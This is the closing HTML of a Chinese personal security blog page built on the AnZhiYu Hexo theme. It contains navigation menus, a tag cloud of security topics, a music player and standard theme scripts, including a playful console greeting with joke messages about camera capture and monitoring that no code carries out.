"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 0.88rem;">CTF<sup>2</sup></a><a href="/tags/Java-Security/" style="font-size: 0.88rem;">Java Security<sup>1</sup></a><a href="/tags/JavaScript/" style="font-size: 0.88rem;">JavaScript<sup>1</sup></a><a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Java安全<sup>1</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>1</sup></a><a href="/tags/PHP%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">PHP安全<sup>1</sup></a><a href="/tags/Python%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Python安全<sup>1</sup></a><a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" style="font-size: 0.88rem;">原型链污染<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">渗透<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7/" style="font-size: 0.88rem;">红队技巧<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="12912681917" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/#/playlist?id=12912681917&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Ec3o 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
